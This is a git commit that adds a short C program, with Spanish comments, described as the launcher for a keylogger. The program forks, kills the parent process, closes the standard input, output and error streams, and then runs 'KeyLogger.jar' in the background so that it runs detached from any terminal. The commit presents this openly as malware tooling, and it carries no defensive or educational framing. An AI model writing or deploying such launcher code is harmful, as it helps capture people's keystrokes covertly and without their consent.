5eb6d0ae0ff83a6addbf985be8d6fbe7109e4d4d
reitmas325 <42395690+reitmas325@users.noreply.github.com>
2019-10-31 19:39:42 -0600

    Creacion del activador del KeyLogger en C

---
+++ C/main.c
@@ -0,0 +1,29 @@
+//Para el uso de system y exit
+#include <stdlib.h>
+//Para el uso de fork y close
+#include <unistd.h>
+//Para el uso de pid_t
+#include <fcntl.h>
+
+int main(int argc, char const *argv[])
+{
+
+    //creamos un nuevo prceso
+    pid_t pid = fork();
+    //si hubo un error al crear el nuevo proceso salimos y mandamos un error 10
+    if(pid < 0) exit(10);
+    //Si se creo bien el nuevo proceso matamos el proceso actual
+    if(pid > 0) exit(0);
+
+    //Bloqueamos las entrada estandar
+    close(O_RDONLY);
+    //Bloqueamos la salida estandar
+    close(O_WRONLY);
+    //Bloqueamos la salida de Error
+    close(O_RDWR);
+
+    //Ejecutamos el KeyLogger creado en java 
+    system("java -jar KeyLogger.jar");
+
+    return 0x0;
+}
